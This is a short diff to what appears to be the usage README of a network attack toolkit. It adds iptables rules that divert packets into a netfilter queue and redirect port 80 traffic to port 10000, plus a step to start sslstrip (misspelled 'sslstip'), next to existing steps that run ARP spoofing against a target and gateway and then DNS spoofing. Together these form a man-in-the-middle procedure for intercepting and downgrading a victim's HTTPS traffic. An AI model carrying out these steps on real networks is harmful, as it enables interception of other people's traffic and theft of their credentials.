@@ -5,7 +5,12 @@
 * Install netfilterqueue
 `pip install netfilterqueue`
 * Create queue
-`iptables -I FORWARD -j NFQUEUE --queue-num 0`
+`iptables -I INPUT -j NFQUEUE --queue-num 0`
+`iptables -I OUTPUT -j NFQUEUE --queue-num 0`
+* Enable port redirecting
+`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`
+* Start sslstrip
+`sslstip`
 * Run arp spoofing script
 `python arp_spoofing.py -t target_ip -g gateway_ip`
 * Run dns_spoofing script
